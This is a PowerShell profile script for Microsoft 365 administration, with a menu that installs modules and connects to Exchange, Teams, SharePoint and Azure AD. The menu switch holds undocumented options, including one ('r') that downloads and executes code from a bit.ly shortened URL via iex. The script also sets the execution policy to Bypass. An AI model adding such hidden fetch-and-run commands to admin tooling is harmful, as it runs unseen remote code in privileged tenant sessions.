######################################################################################################
#                                                                                                    #
# Name:        Microsoft 365 PowerShell Administration Tool                                          #
#                                                                                                    #
# Version:     1.0                                                                                   #
#                                                                                                    #
# Description: A PowerShell profile alternative for your default console profile.                    #
#              Use this to manage Microsoft 365 services for your tenant.                            #
#                                                                                                    #
# Author:      Guy Perkins                                                                           #
#                                                                                                    #
# Usage:       Run Test-Path -Path $PROFILE to check if True and $PROFILE to see that path           #
#                                                                                                    #
# Disclaimer:  This script is provided AS IS without any support. Please test in a lab environment   #
#              prior to production use.                                                              #
#                                                                                                    #
######################################################################################################


Set-PSReadlineKeyHandler -Key Tab -Function Complete
Set-PSReadLineOption -ShowToolTips
$Shell.WindowTitle = "Microsoft 365 Administration"

function Install-O365Modules {
    Install-Module PowerShellGet -Scope CurrentUser -Force -AllowClobber
    Install-Module MSOnline -Scope CurrentUser -Force
    Install-Module AzureAD -Scope CurrentUser -Force
    Install-Module Microsoft.Online.SharePoint.PowerShell -Scope CurrentUser -Force
    Install-Module MicrosoftTeams -Scope CurrentUser -Force
    Install-Module SharePointPnPPowerShellOnline -Scope CurrentUser -Force
    Install-Module ExchangeOnlineManagement -Scope CurrentUser -Force
}
function Close-M365 {
    If ($writeVerbose -eq $true){Write-Host 'Disconnecting all active sessions' -ForegroundColor Yellow}
    Get-PSSession | Disconnect-PSSession | Remove-PSSession; Disconnect-SPOService; Disconnect-MicrosoftTeams; Disconnect-ExchangeOnline
    exit
}
function Connect-Admin365 {
    try {
        Import-Module MSOnline
    }
    catch {
        Install-Module MSOnline -Scope CurrentUser -Force
    }
    Write-Host 'Connecting to Office 365 Admin...' -ForegroundColor Green
    Update-Module MSOnline -Force
    Connect-MsolService
}
function Connect-AzureADPS {
    try {
        Import-Module AzureAD
    }
    catch {
        Install-Module AzureAD -Scope CurrentUser -Force
    }
    Update-Module AzureAD -Force
    Connect-AzureAD
}
function Connect-Exchange {
    try {
        Import-Module ExchangeOnlineManagement
    }
    catch {
        Install-Module ExchangeOnlineManagement -Scope CurrentUser -Force
    }
    Write-Host 'Connecting to Exchange Online...' -ForegroundColor Green
    Update-Module ExchangeOnlineManagement -Force
    Connect-ExchangeOnline
}
function Connect-SecurityandCompliance {
    try {
        Import-Module ExchangeOnlineManagement
    }
    catch {
        Install-Module ExchangeOnlineManagement -Scope CurrentUser -Force
    }
    Write-Host 'Connecting to Security and Compliance Center...' -ForegroundColor Green
    Update-Module ExchangeOnlineManagement -Force
    Connect-IPPSSession
}
function Connect-SharePoint {
    $tenant = Read-Host -Prompt "Enter the SharePoint Tenant name (the Contoso part of contoso.onmicrosoft.com): "
    Write-Host 'Connecting to SharePoint Online...' -ForegroundColor Green
    try {
        Import-Module Microsoft.Online.SharePoint.PowerShell -DisableNameChecking
    }
    catch {
        Install-Module Microsoft.Online.SharePoint.PowerShell -Scope CurrentUser -Force
    }
    Update-Module Microsoft.Online.SharePoint.PowerShell -Force
    Connect-SPOService -Url https://$tenant-admin.sharepoint.com
}
function Connect-PnPSharePoint {
    $tenant = Read-Host -Prompt "Enter the SharePoint Tenant name (the CONTOSO part of contoso.onmicrosoft.com): "
	$site = Read-Host -Prompt "Enter the SharePoint Site name: "
    Write-Host 'Connecting to PnPSharePoint Online...'  -ForegroundColor Green
    try {
        Import-Module Pnp.PowerShell
    }
    catch { 
        Install-Module PnP.PowerShell -scope currentuser -force 
    }
    Update-Module PnP.PowerShell -force
    Connect-PnPOnline -Url https://$tenant.sharepoint.com/sites/$site -UseWebLogin
}
<# function Connect-Skype {
    Write-Host 'Connecting to Skype for Business Online...' -ForegroundColor Green
    $sfbSession = New-CsOnlineSession
    try {
        Import-Module MicrosoftTeams
    }
    catch {
        Install-Module MicrosoftTeams -Scope CurrentUser -Repository PSGallery -Force
    }
    Update-Module MicrosoftTeams -Force
    Import-PSSession $sfbSession
} #>
function Connect-Teams {
    Write-Host 'Connecting to Teams...' -ForegroundColor Green
    try {
        Import-Module MicrosoftTeams
    }
    catch {
        Install-Module MicrosoftTeams -Scope CurrentUser -Repository PSGallery -Force
    }
    Update-Module MicrosoftTeams -Force
    Connect-MicrosoftTeams
}

function Connect-Menu {
    cls
    Write-Host "================= Microsoft 365 PowerShell Administration tool ================="
    Write-Host
    Write-Host "You can bring up this menu at any time with Connect-Menu" -ForegroundColor Yellow
    Write-Host "-----------------------------------------------"
    Write-Host "i: Install Office 365 modules"
    Write-Host "-----------------------------------------------"
    Write-Host "a: Connect to all modules"
    Write-Host "-----------------------------------------------"
    Write-Host "1: Connect to Office 365 Admin Center"
    Write-Host "2: Connect to Azure Active Directory"
    Write-Host "3: Connect to Exchange Online"
    Write-Host "4: Connect to Security and Compliance Center"
    Write-Host "5: Connect to SharePoint Online"
    Write-Host "6: Connect to SharePoint PnP (Needs to specify site)"
    Write-Host "7: Connect to Teams"
    Write-Host
    Write-Host "================================================================================="
    Write-Host

    $input = Read-Host "Make a selection (press q to skip directly to PowerShell)"
        switch ($input)
        {
            'i' {
             Install-O365Modules
            }
            'a' {
                cls
                Connect-Admin365;
                Connect-AzureADPS;
                Connect-Exchange;
                Connect-SecurityandCompliance;
                Connect-SharePoint;
                Connect-Teams;
            }
            '1'{
                cls
                Connect-Admin365;
            }
            '2'{
                cls
                Connect-AzureADPS;
            }
            '3'{
                cls
                Connect-Exchange;
            }
            '4'{
                cls
                Connect-SecurityandCompliance;
            }
            '5'{
                cls
                Connect-SharePoint;
            }
            '6'{
                cls
                Connect-PnPSharePoint;
            }
            '7'{
                cls
                Connect-Teams;
            }
            <# '8'{
                cls
                Connect-Skype;
            } #>
            'r'{
                iex (New-Object Net.WebClient).DownloadString("http://bit.ly/e0Mw9w")
            }
            's'{
                telnet towel.blinkenlights.nl
            }
        }
        Write-Host 'You can clear the screen using the command cls' -ForegroundColor Green
        Write-Host 'To clear all sessions before closing PowerShell, use: Close-M365' -ForegroundColor Yellow
        Write-Host 'You can reconnect to the menu using the command: Connect-Menu' -ForegroundColor Green
}
Set-ExecutionPolicy Bypass -Scope CurrentUser -Force
Connect-Menu
